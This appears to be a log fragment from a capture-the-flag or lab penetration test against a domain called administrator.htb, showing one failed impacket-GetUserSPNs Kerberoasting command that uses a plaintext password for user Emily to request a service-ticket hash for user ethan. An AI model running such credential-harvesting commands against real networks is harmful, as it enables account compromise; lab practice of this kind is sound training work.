@@ -1,0 +1,19 @@
+### [2026-04-10 04:27:14] impacket-GetUserSPNs -dc-ip 10.129.245.95 -k no administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request-user ethan -outputfile ethan_tgs.hash
+
+$ impacket-GetUserSPNs -dc-ip 10.129.245.95 -k no administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb -request-user ethan -outputfile ethan_tgs.hash
+
+usage: GetUserSPNs.py [-h] [-target-domain TARGET_DOMAIN]
+                      [-no-preauth NO_PREAUTH] [-stealth] [-machine-only]
+                      [-usersfile USERSFILE] [-request]
+                      [-request-user username | -request-machine machinename]
+                      [-save] [-outputfile OUTPUTFILE] [-ts] [-debug]
+                      [-hashes LMHASH:NTHASH] [-no-pass] [-k]
+                      [-aesKey hex key] [-dc-ip ip address]
+                      [-dc-host hostname]
+                      target
+GetUserSPNs.py: error: unrecognized arguments: administrator.htb/Emily:UXLCI5iETUsIBoFVTj8yQFKoHjXmb
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+
+# Exit code: 2
+# Duration: 2026-04-10 04:27:14
